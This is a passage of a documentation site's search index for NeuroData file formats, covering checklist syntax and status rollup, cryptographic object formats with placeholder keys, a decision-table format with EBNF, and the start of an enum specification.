Text\n</code></pre></p> <ul> <li>Indentation: Optional leading whitespace (spaces or tabs) before the <code>-</code> defines the item's nesting level (calculated as number of runes). Significant for automatic status rollup (see Section 4.2).</li> <li>Marker: Must start with a hyphen (<code>-</code>) followed by at least one space (<code>-</code>).</li> <li>Delimiter:<ul> <li><code>[</code>...<code>]</code> (Square Brackets): Indicate a manual item whose status is set directly.</li> <li><code>|</code>...<code>|</code> (Pipe Symbols): Indicate an automatic item whose status should be calculated by tools based on its children (see Section 4.2). The parser identifies the closing pipe relative to the opening one.</li> </ul> </li> <li>Status Symbol (Inside Delimiters): A single character representing the current state.<ul> <li>Parsed Symbols: The parser recognizes:<ul> <li><code></code> (space) or empty (<code>[]</code>, <code>||</code>) -&gt; Parsed Status: \"pending\"</li> <li><code>x</code> or <code>X</code> -&gt; Parsed Status: \"done\" (Normalized to 'x')</li> <li><code>-</code> -&gt; Parsed Status: \"partial\"</li> <li>Any other single non-whitespace character (e.g., <code>?</code>, <code>!</code>, <code>*</code>, <code>\ud83d\udd25</code>) -&gt; Parsed Status: \"special\".</li> </ul> </li> <li>Malformed Delimiter Content: If the content inside <code>[]</code> or <code>||</code> is not empty and contains more than one character (e.g., <code>[xx]</code>, <code>|?!|</code>), the parser returns <code>ErrMalformedItem</code>.</li> </ul> </li> <li>Description Text: Any text following the closing delimiter (<code>]</code> or <code>|</code>). Leading/trailing whitespace around the description is trimmed by the parser.</li> </ul>"},{"location":"NeuroData/checklist/#22-other-allowed-lines","title":"2.2 Other Allowed Lines","text":"<ul> <li>File-Level Metadata: <code>:: key: value</code> at the very beginning. Parsed using the <code>metadata</code> package.</li> <li>Markdown Headings: Lines starting with <code>#</code>. Skipped by the checklist parser.</li> <li>Comments: Lines starting with <code>#</code> or <code>--</code> (after optional whitespace). Skipped.</li> <li>Blank Lines: Skipped.</li> </ul>"},{"location":"NeuroData/checklist/#23-end-of-checklist","title":"2.3 End of Checklist","text":"<p>The checklist parsing stops at the first line encountered that is not a valid checklist item (manual or automatic), a heading, a comment, a blank line, or a valid file-level metadata line (if before any items).</p>"},{"location":"NeuroData/checklist/#3-metadata","title":"3. Metadata","text":""},{"location":"NeuroData/checklist/#31-file-level-metadata","title":"3.1 File-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines at the very beginning of the content, parsed by the <code>metadata.Extract</code> function.</p>"},{"location":"NeuroData/checklist/#32-block-level-metadata-in-composite-files","title":"3.2 Block-Level Metadata (in Composite Files)","text":"<p>Standard <code>:: key: value</code> lines immediately preceding a fenced code block (e.g., ```neurodata-checklist). Handled by block extraction tools.</p>"},{"location":"NeuroData/checklist/#4-status-interpretation-and-rollup","title":"4. Status Interpretation and Rollup","text":"<p>(Section remains the same as previous version, describes the intended semantics.)</p>"},{"location":"NeuroData/checklist/#41-item-status-categories","title":"4.1 Item Status Categories","text":"<ul> <li>Pending: Symbol  (space). Written as <code>[ ]</code> (manual) or <code>| |</code> (automatic, calculated).</li> <li>Done: Symbol <code>x</code> (normalized from <code>x</code> or <code>X</code>). Written as <code>[x]</code> (manual) or <code>|x|</code> (automatic, calculated).</li> <li>Partial: Symbol <code>-</code>. Written as <code>[-]</code> (manual) or <code>|-|</code> (automatic, calculated).</li> <li>Special: Symbol is any single character other than space, <code>x</code>, <code>X</code>, or <code>-</code>. Examples: <code>?</code>, <code>!</code>, <code>*</code>, <code>\ud83d\udd25</code>. Written as <code>[?]</code> (manual) or <code>|?|</code> (automatic, calculated).</li> <li>Automatic: Indicated by the use of <code>| |</code> delimiters instead of <code>[ ]</code>. The symbol inside <code>||</code> represents the calculated status based on children. The parser sets an <code>IsAutomatic</code> flag.</li> </ul>"},{"location":"NeuroData/checklist/#42-status-rollup-logic-for-automatic-items","title":"4.2 Status Rollup Logic (for Automatic <code>| |</code> Items)","text":"<p>When a tool updates or reformats a checklist containing automatic items (parsed with <code>||</code>), it should determine the status symbol for that item by examining its direct children. The rules are applied in order of priority:</p> <ol> <li>Special Wins: If any direct child has a \"Special\" status (e.g., <code>[?]</code>, <code>|!|</code>), the automatic parent item takes on the status symbol of the first special child encountered (e.g., <code>?</code>, <code>!</code>).</li> <li>Partial if Any Partial/Done: Else if any direct child has \"Partial\" (<code>[-]</code>, <code>|-|</code>) OR \"Done\" (<code>[x]</code>, <code>|x|</code>) status, the automatic parent item's status symbol becomes <code>-</code> (Partial).</li> <li>Done if All Done: Else if all direct children are \"Done\" (<code>[x]</code>, <code>|x|</code>), the automatic parent item's status symbol becomes <code>x</code> (Done).</li> <li>Pending if All Pending: Else (must mean all direct children are \"Pending\" <code>[ ]</code> or <code>| |</code>), the automatic parent item's status symbol remains <code></code> (Pending).</li> <li>No Children: If an automatic item has no direct children, its status symbol is <code></code> (Pending).</li> </ol>"},{"location":"NeuroData/checklist/#5-parser-output-errors","title":"5. Parser Output &amp; Errors","text":"<p>The <code>ParseChecklist</code> function returns a <code>ParsedChecklist</code> struct containing <code>Metadata map[string]string</code> and <code>Items []ChecklistItem</code>, or an error.</p>"},{"location":"NeuroData/checklist/#51-checklistitem-struct","title":"5.1 ChecklistItem Struct","text":"<ul> <li><code>Text</code>: string (Trimmed description)</li> <li><code>Status</code>: string (\"pending\", \"done\", \"partial\", \"special\")</li> <li><code>Symbol</code>: rune (' ', 'x', '-', '?', '!', etc.)</li> <li><code>Indent</code>: int (Number of leading runes before '-')</li> <li><code>LineNumber</code>: int (1-based line number in the original input)</li> <li><code>IsAutomatic</code>: bool (True if <code>| |</code> was used, false if <code>[ ]</code> was used)</li> </ul>"},{"location":"NeuroData/checklist/#52-defined-errors","title":"5.2 Defined Errors","text":"<ul> <li><code>ErrMalformedItem</code>: Returned if delimiter content is invalid (e.g., <code>[xx]</code>).</li> <li><code>ErrNoContent</code>: Returned if the input contains no valid metadata or checklist items after skipping comments/blanks/headings.</li> <li><code>ErrScannerFailed</code>: Returned if an underlying error occurs during line scanning (wraps the original scanner error).</li> </ul>"},{"location":"NeuroData/checklist/#6-canonical-formatting","title":"6. Canonical Formatting","text":"<p>Tools that reformat checklists should aim for this output:</p> <ul> <li>Manual Pending items: <code>- [ ] Description</code></li> <li>Manual Done items: <code>- [x] Description</code></li> <li>Manual Partial items: <code>- [-] Description</code></li> <li>Manual Special items: <code>- [?] Description</code> (using the specific symbol)</li> <li>Automatic items: Written using <code>| |</code> delimiters with the calculated status symbol inside (e.g., <code>- |-| Description</code> if calculated as partial, <code>- |!| Description</code> if calculated as special '!', <code>- | | Description</code> if pending).</li> <li>Indentation: Preserved or normalized.</li> </ul>"},{"location":"NeuroData/checklist/#7-examples","title":"7. Examples","text":""},{"location":"NeuroData/checklist/#example-1-manual-and-special-statuses","title":"Example 1: Manual and Special Statuses","text":"<p>(Uses <code>[]</code>) <pre><code>- [ ] Pending task\n- [x] Completed task\n- [-] Partially completed task\n- [?] Task needing information (Special)\n- [!] Task blocked (Special)\n</code></pre></p>"},{"location":"NeuroData/checklist/#example-2-automatic-rollup-using-marker","title":"Example 2: Automatic Rollup (Using <code>| |</code> Marker)","text":"<pre><code># Input with Automatic Markers (using | | initially)\n- | | Overall Project\n  - [x] Phase 1 Done\n  - [-] Phase 2 Partial\n  - [ ] Phase 3 Pending\n- | | Feature A\n  - [?] Sub-task A1 (Needs Info - Special)\n  - [ ] Sub-task A2\n- | | Feature B\n  - [x] Sub-task B1\n  - [x] Sub-task B2\n- | | Feature C (No Children)\n- | | Feature D\n  - [ ] Step D1\n  - [ ] Step D2\n\n# Output After Tool Reformats/Updates\n- |-| Overall Project # Partial: Contains Partial/Done children\n  - [x] Phase 1 Done\n  - [-] Phase 2 Partial\n  - [ ] Phase 3 Pending\n- |?| Feature A # Special: First child is '?'\n  - [?] Sub-task A1 (Needs Info - Special)\n  - [ ] Sub-task A2\n- |x| Feature B # Done: All children done\n  - [x] Sub-task B1\n  - [x] Sub-task B2\n- | | Feature C (No Children) # Pending: No children\n- | | Feature D # Pending: All children pending\n  - [ ] Step D1\n  - [ ] Step D2\n</code></pre>"},{"location":"NeuroData/checklist/#example-3-file-with-metadata-and-special-rollup-using-marker","title":"Example 3: File With Metadata and Special Rollup (Using <code>| |</code> Marker)","text":"<p><pre><code>:: version: 0.2.0\n:: type: Checklist\n:: component: Backend\n\n# API Endpoints\n- | | User Management # Marked as automatic\n  - [x] GET /users\n  - [x] POST /users\n  - [-] GET /users/{id} (Partial status)\n  - [\ud83d\udd25] PUT /users/{id} (Special status: on fire!)\n  - [ ] DELETE /users/{id}\n- [ ] Order Processing # Manual item\n</code></pre> After reformatting, the <code>User Management</code> line would become <code>|\ud83d\udd25| User Management</code> because the first \"Special\" status (<code>\ud83d\udd25</code>) encountered among its direct children takes precedence.</p>"},{"location":"NeuroData/cryptographic/","title":"NeuroData Cryptographic Formats Specification","text":"<p>:: type: Specification :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine attributes for each type, specify encoding formats (PEM, Base64, Hex), detail tool requirements and expected behaviors.</p>"},{"location":"NeuroData/cryptographic/#1-purpose","title":"1. Purpose","text":"<p>This document defines a set of NeuroData formats for representing common cryptographic objects: identities/key pairs (<code>.ndid</code>), digital certificates (<code>.ndcert</code>), digital signatures (<code>.ndsig</code>), and cryptographic hashes (<code>.ndhash</code>). These formats aim to store cryptographic information and metadata in a human-readable structure suitable for use within the NeuroScript ecosystem, primarily facilitating verification, identification, and integrity checks performed by dedicated tools.</p>"},{"location":"NeuroData/cryptographic/#2-security-considerations","title":"2. Security Considerations","text":"<ul> <li>Private Keys: These formats are NOT intended for storing sensitive private key material directly in plain text. Private keys should be managed through secure external mechanisms (e.g., hardware security modules, encrypted storage, environment variables). References (like <code>PRIVATE_KEY_REF</code>) may point to identifiers for such keys, but the key data itself should generally not be present. Storing public keys, certificates, signatures, and hashes is the primary goal.</li> <li>Tooling: The usefulness of these formats is entirely dependent on the existence and correct implementation of secure cryptographic tools within the NeuroScript environment (see Section 5).</li> </ul>"},{"location":"NeuroData/cryptographic/#3-common-elements","title":"3. Common Elements","text":"<p>All cryptographic formats below generally follow these conventions: * Structure: Tagged Line Structure (similar to <code>.ndform</code>), where each object starts with metadata, followed by attribute lines defining its properties. * Metadata: Each format uses standard <code>:: key: value</code> metadata, including <code>:: type: &lt;TypeName&gt;</code>, <code>:: version:</code>, and potentially <code>:: id:</code>. * Data Encoding: Large opaque data like public keys, certificates, or signatures are typically stored within fenced blocks (e.g., <code>pem ...</code>, <code>base64 ...</code>, <code>hex ...</code>) immediately following their corresponding attribute tag (e.g., <code>PUBLIC_KEY</code>, <code>CERTIFICATE</code>, <code>SIGNATURE</code>, <code>HASH_VALUE</code>). The language tag of the fence indicates the encoding. Simple hashes or fingerprints might be represented as quoted strings directly on the attribute line. * References: Uses the standard <code>[ref:&lt;location&gt;#&lt;block_id&gt;]</code> or <code>[ref:&lt;location&gt;]</code> syntax [cite: generated previously in <code>docs/references.md</code>] to link related objects (e.g., a signature referencing the content it signs, a certificate referencing its public key identity).</p>"},{"location":"NeuroData/cryptographic/#4-format-specifications","title":"4. Format Specifications","text":""},{"location":"NeuroData/cryptographic/#41-identity-key-pair-ndid","title":"4.1 Identity / Key Pair (<code>.ndid</code>)","text":"<ul> <li>Purpose: Represents a cryptographic identity, primarily its public key.</li> <li><code>:: type: Identity</code></li> <li>Attributes:<ul> <li><code>LABEL \"&lt;name&gt;\"</code>: Human-readable name.</li> <li><code>TYPE \"&lt;algorithm&gt;\"</code>: E.g., \"RSA\", \"Ed25519\", \"ECDSA\".</li> <li><code>SIZE &lt;bits&gt;</code>: Key size (e.g., 2048, 256).</li> <li><code>PUBLIC_KEY</code> (Followed by <code>```pem ... ```</code> block containing the public key).</li> <li><code>PRIVATE_KEY_REF \"&lt;identifier_or_uri&gt;\"</code>: (Optional, points to secure storage, NOT the key itself).</li> <li><code>CREATED_AT &lt;timestamp&gt;</code>: (Optional).</li> <li><code>DESCRIPTION \"&lt;text&gt;\"</code>: (Optional).</li> </ul> </li> <li>Example: <pre><code>:: type: Identity\n:: version: 0.1.0\n:: id: service-key-001\n\nLABEL \"Main Service Signing Key\"\nTYPE \"Ed25519\"\nPUBLIC_KEY ```pem\n-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEA[...]EXAMPLE[...]oW1lA=\n-----END PUBLIC KEY-----\n</code></pre>     CREATED_AT 2024-03-01T12:00:00Z     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#42-certificate-ndcert","title":"4.2 Certificate (<code>.ndcert</code>)","text":"<ul> <li>Purpose: Represents a digital certificate (typically X.509).</li> <li><code>:: type: Certificate</code></li> <li>Attributes:<ul> <li><code>SUBJECT \"&lt;distinguished_name&gt;\"</code></li> <li><code>ISSUER \"&lt;distinguished_name&gt;\"</code></li> <li><code>SERIAL_NUMBER \"&lt;hex_or_decimal_string&gt;\"</code></li> <li><code>VERSION &lt;number&gt;</code> (e.g., 3 for X.509v3)</li> <li><code>VALID_FROM &lt;timestamp&gt;</code></li> <li><code>VALID_UNTIL &lt;timestamp&gt;</code></li> <li><code>SIGNATURE_ALGORITHM \"&lt;name_or_oid&gt;\"</code></li> <li><code>PUBLIC_KEY_INFO</code> (Optional, followed by <code>```text ... ```</code> block with details like type/size, or use <code>PUBLIC_KEY_REF</code>)</li> <li><code>PUBLIC_KEY_REF \"[ref:...]\"</code> (Optional link to an <code>.ndid</code> object).</li> <li><code>FINGERPRINT_SHA256 \"&lt;hex_string&gt;\"</code> (Optional, common identifier).</li> <li><code>CERTIFICATE</code> (Followed by <code>```pem ... ```</code> block containing the certificate).</li> </ul> </li> <li>Example: <pre><code>:: type: Certificate\n:: version: 0.1.0\n:: id: web-server-cert-2025\n\nSUBJECT \"CN=[www.example.com](https://www.example.com), O=Example Corp, C=US\"\nISSUER \"CN=Example Intermediate CA G1, O=Example Corp, C=US\"\nSERIAL_NUMBER \"1A:2B:3C:4D:...\"\nVERSION 3\nVALID_FROM 2024-01-01T00:00:00Z\nVALID_UNTIL 2025-01-01T23:59:59Z\nSIGNATURE_ALGORITHM \"SHA256withRSA\"\nFINGERPRINT_SHA256 \"a1b2c3d4e5f6...\"\nPUBLIC_KEY_REF \"[ref:keys/webserver.ndid#key-01]\"\nCERTIFICATE ```pem\n-----BEGIN CERTIFICATE-----\nMIIDqDCCApCgAwIBAgIJA[...]EXAMPLE[...]K4A/DQ==\n-----END CERTIFICATE-----\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#43-signature-ndsig","title":"4.3 Signature (<code>.ndsig</code>)","text":"<ul> <li>Purpose: Represents a digital signature over specified content.</li> <li><code>:: type: Signature</code></li> <li>Attributes:<ul> <li><code>CONTENT_REF \"[ref:&lt;location&gt;[#&lt;block_id&gt;]]\"</code>: Reference to the signed content (file or block).</li> <li><code>SIGNER_REF \"[ref:&lt;location&gt;#&lt;key_id&gt;]\"</code>: Reference to the signer's <code>.ndid</code> public key.</li> <li><code>ALGORITHM \"&lt;sig_alg_name&gt;\"</code>: E.g., \"SHA256withRSA\", \"EdDSA\", \"ECDSAwithSHA256\".</li> <li><code>TIMESTAMP &lt;iso8601_timestamp&gt;</code>: (Optional) Time of signing.</li> <li><code>SIGNATURE</code> (Followed by <code>```base64 ... ```</code> or <code>```hex ... ```</code> block containing the signature value).</li> </ul> </li> <li>Example: <pre><code>:: type: Signature\n:: version: 0.1.0\n:: id: manifest-sig-v2\n\nCONTENT_REF \"[ref:manifest.json]\"\nSIGNER_REF \"[ref:identities/release_key.ndid#prod-signer]\"\nALGORITHM \"EdDSA\"\nTIMESTAMP 2024-04-12T14:30:00Z\nSIGNATURE ```base64\nK7L[...]EXAMPLE[...]9wA=\n</code></pre>     ```</li> </ul>"},{"location":"NeuroData/cryptographic/#44-hash-ndhash","title":"4.4 Hash (<code>.ndhash</code>)","text":"<ul> <li>Purpose: Represents a cryptographic hash of specified content.</li> <li><code>:: type: Hash</code></li> <li>Attributes:<ul> <li><code>CONTENT_REF \"[ref:&lt;location&gt;[#&lt;block_id&gt;]]\"</code>: Reference to the hashed content.</li> <li><code>ALGORITHM \"&lt;hash_alg_name&gt;\"</code>: E.g., \"SHA-256\", \"SHA-512\", \"BLAKE2b-256\".</li> <li><code>HASH_VALUE \"&lt;hex_string&gt;\"</code>: The hash value, typically hex encoded. (Could allow Base64 block too).</li> </ul> </li> <li>Example: <pre><code>:: type: Hash\n:: version: 0.1.0\n\nCONTENT_REF \"[ref:firmware.bin]\"\nALGORITHM \"SHA-256\"\nHASH_VALUE \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\"\n</code></pre></li> </ul>"},{"location":"NeuroData/cryptographic/#5-tooling-requirements","title":"5. Tooling Requirements","text":"<p>Using these formats effectively requires a suite of cryptographic tools within the NeuroScript environment. These tools currently do not exist [cite: uploaded:neuroscript/pkg/core/tools_register.go] and would need to be implemented, potentially wrapping standard Go cryptographic libraries.</p> <p>Potential required tools: * <code>TOOL.GenerateKeyPair(type, size)</code> -&gt; <code>ndid_content</code> * <code>TOOL.CalculateHash(content_ref_or_string, algorithm)</code> -&gt; <code>hash_value_string</code> * <code>TOOL.CreateSignature(content_ref_or_string, private_key_ref, algorithm)</code> -&gt; <code>signature_value_base64</code> * <code>TOOL.VerifySignature(signature_ref, public_key_ref_or_ndid, algorithm)</code> -&gt; <code>bool</code> (Verifies against the content referenced within the <code>.ndsig</code> file/block). * <code>TOOL.ParseCertificate(cert_ref_or_content)</code> -&gt; <code>map</code> (Extracts fields from a certificate). * <code>TOOL.ValidateCertificate(cert_ref, trusted_roots_ref)</code> -&gt; <code>bool</code> (Checks validity period, signature, potentially chain). * <code>TOOL.GetPublicKeyFromCert(cert_ref_or_content)</code> -&gt; <code>ndid_content</code> (Extracts public key from cert). * <code>TOOL.EncodeData(data, format)</code> -&gt; <code>string</code> (e.g., format=\"base64\", \"hex\", \"pem\") * <code>TOOL.DecodeData(encoded_string, format)</code> -&gt; <code>data</code></p> <p>Implementing these tools securely requires careful handling of keys and cryptographic primitives.</p>"},{"location":"NeuroData/decision_table/","title":"NeuroData Decision Table Format (.nddt) Specification","text":"<p>:: type: DecisionTableFormatSpec :: version: 0.1.0 :: status: draft :: dependsOn: docs/metadata.md, docs/references.md, docs/neurodata/table.md, docs/neurodata_and_composite_file_spec.md :: howToUpdate: Refine condition/action syntax, cell value representations (ranges, wildcards), hit policy definitions, EBNF, examples.</p>"},{"location":"NeuroData/decision_table/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Decision Tables (<code>.nddt</code>) provide a structured, human-readable format for representing business rules and decision logic. They map combinations of input Conditions to determined Actions or Outcomes. This format aims to make complex conditional logic explicit, inspectable, and manageable, separating it from procedural NeuroScript code.</p> <p>While potentially inspired by logic programming concepts like Prolog, the <code>.nddt</code> format focuses on a tabular representation for readability and tool-based evaluation, rather than direct execution as Prolog clauses.</p>"},{"location":"NeuroData/decision_table/#2-relation-to-table-format-ndtable","title":"2. Relation to Table Format (<code>.ndtable</code>)","text":"<p>The <code>.nddt</code> syntax borrows heavily from the <code>.ndtable</code> format for its structure (metadata, schema definition, delimited rows). However, its semantics are different: * <code>.ndtable</code> stores rows of data records. * <code>.nddt</code> stores rows of rules, where columns represent logical conditions or resulting actions/outcomes. * Tooling interaction is distinct: <code>.ndtable</code> supports CRUD operations, while <code>.nddt</code> is primarily used for evaluation via a dedicated tool (e.g., <code>TOOL.EvaluateDecisionTable</code>).</p> <p>Therefore, <code>.nddt</code> uses its own <code>:: type: DecisionTable</code> metadata.</p>"},{"location":"NeuroData/decision_table/#3-syntax-nddt","title":"3. Syntax (<code>.nddt</code>)","text":"<p>An <code>.nddt</code> file or block consists of the following sections in order: 1.  File/Block-Level Metadata: Optional <code>:: key: value</code> lines [cite: uploaded:neuroscript/docs/metadata.md]. 2.  Schema Definition: <code>CONDITION</code> and <code>ACTION</code>/<code>OUTCOME</code> definition lines specifying the table's columns. 3.  Rules Separator: A line containing exactly <code>--- RULES ---</code>. 4.  Rule Rows: Lines representing the decision rules, with cells delimited by pipe (<code>|</code>).</p> <p>Comments (<code>#</code> or <code>--</code>) and blank lines are allowed before the schema and between schema lines.</p>"},{"location":"NeuroData/decision_table/#31-fileblock-level-metadata","title":"3.1 File/Block-Level Metadata","text":"<p>Standard <code>:: key: value</code> lines. Recommended metadata includes: * <code>:: type: DecisionTable</code> (Required) * <code>:: version: &lt;semver&gt;</code> (Required) * <code>:: id: &lt;unique_table_id&gt;</code> (Required if referenced) * <code>:: description: &lt;text&gt;</code> (Optional) * <code>:: hitPolicy: &lt;policy&gt;</code> (Optional, default: <code>unique</code> or <code>first</code> - TBD). Defines how multiple matching rules are handled. Common policies (from DMN standard):     * <code>unique</code>: Only one rule can match. Error if multiple match. (Default?)     * <code>first</code>: The first matching rule in document order is selected.     * <code>any</code>: Multiple rules can match, but must all produce the same output. Error if outputs differ.     * <code>collect</code>: All matching rules fire. Outputs are collected (e.g., into a list). Requires defining aggregation for actions if needed (e.g., <code>collect sum</code>, <code>collect list</code>). (Consider deferring complex collect policies).</p>"},{"location":"NeuroData/decision_table/#32-schema-definition-section","title":"3.2 Schema Definition Section","text":"<p>Defines the input conditions and output actions/outcomes as columns. * Condition Definition: <code>CONDITION condition_id data_type [label: \"&lt;text&gt;\"] [validation_rules...]</code>     * <code>CONDITION</code>: Keyword.     * <code>condition_id</code>: Unique identifier (<code>[a-zA-Z_][a-zA-Z0-9_]*</code>) for this condition column. Used to map input data during evaluation.     * <code>data_type</code>: Expected type for matching input data (<code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>enum(...)</code>).     * <code>[label: \"&lt;text&gt;\"]</code>: Optional human-readable description.     * <code>[validation_rules...]</code>: Optional rules (e.g., <code>REGEX</code>, <code>MIN</code>, <code>MAX</code>) applied to input data before matching, if needed. * Action/Outcome Definition: <code>ACTION action_id data_type [label: \"&lt;text&gt;\"]</code> or <code>OUTCOME action_id data_type [label: \"&lt;text&gt;\"]</code>     * <code>ACTION</code> / <code>OUTCOME</code>: Keywords. (Use one consistently, e.g., <code>ACTION</code>).     * <code>action_id</code>: Unique identifier for this output column.     * <code>data_type</code>: Type of the output value defined in the rule rows (<code>string</code>, <code>int</code>, <code>float</code>, <code>bool</code>, <code>timestamp</code>, <code>enum(...)</code>).     * <code>[label: \"&lt;text&gt;\"]</code>: Optional human-readable description.</p>"},{"location":"NeuroData/decision_table/#33-rules-separator","title":"3.3 Rules Separator","text":"<p>A single line containing exactly <code>--- RULES ---</code> MUST follow the schema definition.</p>"},{"location":"NeuroData/decision_table/#34-rule-rows-section","title":"3.4 Rule Rows Section","text":"<ul> <li>Each line after the separator represents one rule.</li> <li>Columns are separated by the pipe character (<code>|</code>), corresponding to the <code>CONDITION</code> and <code>ACTION</code> definitions in order.</li> <li>Condition Cells: Contain the specific criteria for the rule to match.<ul> <li>Literals: Exact values (<code>\"Gold\"</code>, <code>10</code>, <code>true</code>). Must match the <code>CONDITION</code> data type.</li> <li>Wildcard: A hyphen (<code>-</code>) indicates this condition is irrelevant (\"don't care\") for this rule.</li> <li>Ranges/Expressions (Optional - Requires Tool Support): Simple expressions like <code>\"&gt;10\"</code>, <code>\"[18-65]\"</code>, <code>\"!=\\\"Pending\\\"\"</code> could be supported by the evaluation tool. Define syntax clearly if added.</li> </ul> </li> <li>Action/Outcome Cells: Contain the literal output values assigned if the rule matches. Must match the <code>ACTION</code> data type.</li> <li>Escaping: Use <code>\\|</code> for literal pipe, <code>\\\\</code> for literal backslash within cells, as defined for <code>.ndtable</code>.</li> <li>Rule Metadata (Optional): Comments or <code>:: ruleId: &lt;id&gt;</code> can appear after the last cell on a rule line.</li> </ul>"},{"location":"NeuroData/decision_table/#4-ebnf-grammar-draft","title":"4. EBNF Grammar (Draft)","text":"<pre><code>decision_table_file ::= { metadata_line | comment_line | blank_line }\n                        schema_section\n                        rules_separator newline\n                        rules_section ;\n\nmetadata_line       ::= optional_whitespace \"::\" whitespace key \":\" value newline ;\nschema_section        ::= { schema_line | comment_line | blank_line } ;\nschema_line         ::= condition_definition | action_definition ;\ncondition_definition ::= optional_whitespace \"CONDITION\" whitespace identifier whitespace data_type { whitespace property_block } newline ; (* property_block for label? *)\naction_definition   ::= optional_whitespace (\"ACTION\"|\"OUTCOME\") whitespace identifier whitespace data_type { whitespace property_block } newline ;\n\nrules_separator     ::= optional_whitespace \"--- RULES ---\" optional_whitespace ;\nrules_section       ::= { rule_row | comment_line | blank_line } ;\nrule_row            ::= rule_cell { optional_whitespace \"|\" optional_whitespace rule_cell } [ optional_whitespace rule_metadata ] newline ;\nrule_cell           ::= cell_content ; (* Represents condition entry or action entry *)\ncell_content        ::= { character_except_pipe_or_newline | escaped_pipe | escaped_backslash } | \"-\" ; (* Allow wildcard, ranges need spec *)\nrule_metadata       ::= comment_line | metadata_line ; (* Allow rule IDs? *)\n\n(* Define: identifier, key, value, data_type, property_block, validation_rule, whitespace, newline, comment_line, blank_line, etc. *)\n</code></pre>"},{"location":"NeuroData/decision_table/#5-tool-interaction","title":"5. Tool Interaction","text":"<p>The primary interaction is via an evaluation tool: * <code>TOOL.EvaluateDecisionTable(table_ref_or_content, input_data_map)</code>     * <code>table_ref_or_content</code> (String or Reference): The <code>.nddt</code> definition.     * <code>input_data_map</code> (Map): A map where keys match <code>CONDITION</code> IDs and values are the inputs to check (e.g., <code>{\"customer_type\": \"Gold\", \"order_total\": 1200.50}</code>).     * Behavior:         1. Parses the schema and rules.         2. Iterates through rules, comparing <code>input_data_map</code> values against the corresponding <code>CONDITION</code> cells (respecting type, wildcards, potentially ranges).         3. Applies the <code>:: hitPolicy</code>.         4. Collects the values from the <code>ACTION</code> cells of the winning rule(s).     * Returns: (Map) A map where keys match <code>ACTION</code> IDs and values are the results from the selected rule(s) (or an error string/map if evaluation fails or hit policy violated). For <code>collect</code> policies, values might be lists.</p>"},{"location":"NeuroData/decision_table/#6-example","title":"6. Example","text":"<pre><code>:: type: DecisionTable\n:: version: 0.1.0\n:: id: discount-rules-example\n:: hitPolicy: first # First matching rule wins\n\n# Conditions - Input data expected like {\"cust_type\": \"Gold\", \"total\": 1500}\nCONDITION cust_type  string  [label: \"Customer Type\"]\nCONDITION total      float   [label: \"Order Total\"]\n\n# Actions - Output map will be like {\"discount\": 15, \"needs_approval\": true}\nACTION discount         int     [label: \"Discount %\"]\nACTION needs_approval   bool    [label: \"Requires Approval\"]\n\n--- RULES ---\n# Cust Type | Total | Discount | Approval | :: Rule Info\n\"Gold\"     | &gt;1000 | 15       | true     | :: rule_gold_high\n\"Gold\"     | -     | 10       | false    | :: rule_gold_any\n\"Silver\"   | &gt;500  | 7        | false    | :: rule_silver_med\n\"Silver\"   | &lt;=500 | 5        | false    | :: rule_silver_low\n-          | &gt;2000 | 5        | true     | :: rule_any_very_high\n-          | -     | 0        | false    | :: rule_default_catchall\n</code></pre>"},{"location":"NeuroData/enum/","title":"Enum","text":"<p>:: type: NeuroData :: subtype: spec :: version: 0.1.0 :: id: ndenum-spec-v0.1 :: status: draft :: dependsOn: docs/metadata.md, docs/neurodata_and_composite_file_spec.md, docs/NeuroData/map_schema.md :: howToUpdate: Review attributes, examples, EBNF. Ensure consistency with map_schema enum usage.</p>"},{"location":"NeuroData/enum/#neurodata-enum-definition-format-ndenum-specification","title":"NeuroData Enum Definition Format (.ndenum) Specification","text":""},{"location":"NeuroData/enum/#1-purpose","title":"1. Purpose","text":"<p>NeuroData Enum Definitions (<code>.ndenum</code>) provide a standalone, reusable format for defining named enumerated types (controlled vocabularies). Each member (value) of the enumeration can have optional associated metadata, including a human-readable label, a description, a numeric value, and an attached block for arbitrary structured data. This allows for consistent use of controlled values across different NeuroData files (like <code>.ndtable</code>, <code>.ndform</code>, <code>.ndmap_schema</code>) and NeuroScript procedures.</p>"},{"location":"NeuroData/enum/#2-example","title":"2. Example","text":"<pre><code>:: type: EnumDefinition\n:: version: 0.1.0\n:: id: task-status-enum\n:: description: Defines standard statuses for tasks in the system.\n\n# Enum Values Defined Below\n\nVALUE \"pending\"\n  LABEL \"Pending\"\n  DESC \"Task has been created but not yet started.\"\n  NUMERIC 1\n  DATA ```json\n  {\n    \"ui_color\": \"orange\",\n    \"is_active\": false\n  }\n  ```\n\nVALUE \"in-progress\"\n  LABEL \"In Progress\"\n  DESC \"Task is actively being worked on.\"\n  NUMERIC 2\n  DATA ```json\n  {\n    \"ui_color\": \"blue\",\n    \"is_active\": true\n  }\n  ```\n\nVALUE \"completed\"\n  LABEL \"Completed\"\n  DESC \"Task finished successfully.\"\n  NUMERIC 3\n  DATA ```json\n  {\n    \"ui_color\": \"green\",\n    \"is_active\": false\n  }\n  ```\n\nVALUE \"blocked\"\n  # LABEL defaults to \"blocked\" if omitted\n  DESC \"Task cannot proceed due to an issue.\"\n  # NUMERIC is optional\n\nVALUE \"archived\"\n  LABEL \"Archived\"\n  DESC \"Task is closed and hidden from active views.\"\n  NUMERIC -1\n  # No DATA block needed here\n</code></pre>"},{"location":"NeuroData/enum/#3-design-choices-rationale","title":"3. Design Choices / Rationale","text":"<ul> <li>Consistency: The syntax (<code>VALUE</code>, indented attributes) mirrors the <code>DEFINE ENUM</code> block used within the <code>.ndmap_schema</code> format. This promotes consistency and leverages existing parsing patterns.</li> <li>Readability: Keyword-driven attributes (<code>LABEL</code>, <code>DESC</code>, <code>NUMERIC</code>) enhance human readability.</li> <li>Flexibility: Optional attributes and the optional attached <code>DATA</code> block allow for simple or rich enum definitions as needed.</li> <li>Reusability: Standalone files allow enums to be defined once and referenced from multiple other NeuroData files or scripts using standard <code>[ref:&lt;id&gt;]</code> syntax.</li> 